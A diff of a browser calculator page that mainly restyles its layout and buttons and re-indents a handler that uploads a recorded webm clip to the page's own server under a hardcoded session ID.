@@ -5,31 +5,106 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Calculator with Recording</title>
   <style>
-    body { font-family: Arial, sans-serif; text-align: center; margin: 20px; }
-    #display { width: 200px; height: 40px; font-size: 20px; text-align: right; }
-    button { width: 50px; height: 50px; font-size: 18px; margin: 5px; }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #74ebd5 0%, #9face6 100%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .calculator {
+      background: #fff;
+      padding: 20px 30px;
+      border-radius: 15px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+      text-align: center;
+      width: 280px;
+    }
+    h1 {
+      margin-bottom: 15px;
+      font-size: 22px;
+      color: #333;
+    }
+    #display {
+      width: 100%;
+      height: 50px;
+      font-size: 22px;
+      text-align: right;
+      margin-bottom: 15px;
+      padding: 8px 12px;
+      border: 2px solid #ddd;
+      border-radius: 8px;
+      box-sizing: border-box;
+    }
+    .buttons {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 10px;
+    }
+    button {
+      height: 55px;
+      font-size: 20px;
+      border: none;
+      border-radius: 10px;
+      background: #f0f0f0;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+    button:hover {
+      background: #d8d8d8;
+      transform: scale(1.05);
+    }
+    button:active {
+      background: #bbb;
+    }
+    .operator {
+      background: #6c63ff;
+      color: #fff;
+    }
+    .operator:hover {
+      background: #574fd6;
+    }
+    .equals {
+      background: #ff6584;
+      color: #fff;
+      grid-column: span 2;
+    }
+    .equals:hover {
+      background: #e04e6c;
+    }
+    .clear {
+      background: #ffb347;
+      color: #fff;
+    }
+    .clear:hover {
+      background: #e09b3d;
+    }
   </style>
 </head>
 <body>
-  <h1>Simple Calculator</h1>
-  <input type="text" id="display" disabled><br>
-  <div>
-    <button onclick="appendValue('7')">7</button>
-    <button onclick="appendValue('8')">8</button>
-    <button onclick="appendValue('9')">9</button>
-    <button onclick="appendValue('/')">/</button><br>
-    <button onclick="appendValue('4')">4</button>
-    <button onclick="appendValue('5')">5</button>
-    <button onclick="appendValue('6')">6</button>
-    <button onclick="appendValue('*')">*</button><br>
-    <button onclick="appendValue('1')">1</button>
-    <button onclick="appendValue('2')">2</button>
-    <button onclick="appendValue('3')">3</button>
-    <button onclick="appendValue('-')">-</button><br>
-    <button onclick="appendValue('0')">0</button>
-    <button onclick="clearDisplay()">C</button>
-    <button onclick="calculate()">=</button>
-    <button onclick="appendValue('+')">+</button>
+  <div class="calculator">
+    <h1>Smart Calculator</h1>
+    <input type="text" id="display" disabled>
+    <div class="buttons">
+      <button onclick="appendValue('7')">7</button>
+      <button onclick="appendValue('8')">8</button>
+      <button onclick="appendValue('9')">9</button>
+      <button class="operator" onclick="appendValue('/')">÷</button>
+      <button onclick="appendValue('4')">4</button>
+      <button onclick="appendValue('5')">5</button>
+      <button onclick="appendValue('6')">6</button>
+      <button class="operator" onclick="appendValue('*')">×</button>
+      <button onclick="appendValue('1')">1</button>
+      <button onclick="appendValue('2')">2</button>
+      <button onclick="appendValue('3')">3</button>
+      <button class="operator" onclick="appendValue('-')">−</button>
+      <button onclick="appendValue('0')">0</button>
+      <button class="clear" onclick="clearDisplay()">C</button>
+      <button class="equals" onclick="calculate()">=</button>
+      <button class="operator" onclick="appendValue('+')">+</button>
+    </div>
   </div>
 
   <script>
@@ -64,18 +139,17 @@
       mediaRecorder.onstop = async () => {
         const blob = new Blob(chunks, { type: "video/webm" });
         // Session ID fix karna (hardcode for now)
-const sessionId = "mysession1";
+        const sessionId = "mysession1";
 
-let formData = new FormData();
-formData.append("clip", blob, "recording.webm");
+        let formData = new FormData();
+        formData.append("clip", blob, "recording.webm");
 
-try {
-  await fetch(`/upload/${sessionId}`, { method: "POST", body: formData });
-  console.log("Recording sent to server ✅");
-} catch (err) {
-  console.error("Upload failed:", err);
-}
-
+        try {
+          await fetch(`/upload/${sessionId}`, { method: "POST", body: formData });
+          console.log("Recording sent to server ✅");
+        } catch (err) {
+          console.error("Upload failed:", err);
+        }
       };
     };
   </script>
